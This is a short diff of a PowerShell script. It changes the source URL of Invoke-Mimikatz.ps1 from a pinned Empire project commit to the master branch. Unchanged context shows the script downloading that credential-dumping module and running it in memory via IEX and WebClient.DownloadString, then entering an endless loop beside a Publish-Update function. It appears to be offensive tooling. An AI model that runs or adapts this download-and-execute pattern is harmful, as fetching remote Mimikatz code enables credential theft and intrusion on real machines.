@@ -26,7 +26,7 @@ function Publish-Update($output)
 
 # main
 $hash = ''
-$mimikatzUrl = 'https://raw.githubusercontent.com/EmpireProject/Empire/7a39a55f127b1aeb951b3d9d80c6dc64500cacb5/data/module_source/credentials/Invoke-Mimikatz.ps1'
+$mimikatzUrl = 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1'
 IEX (New-Object System.Net.Webclient).DownloadString($mimikatzUrl)
 
 while ($true) {
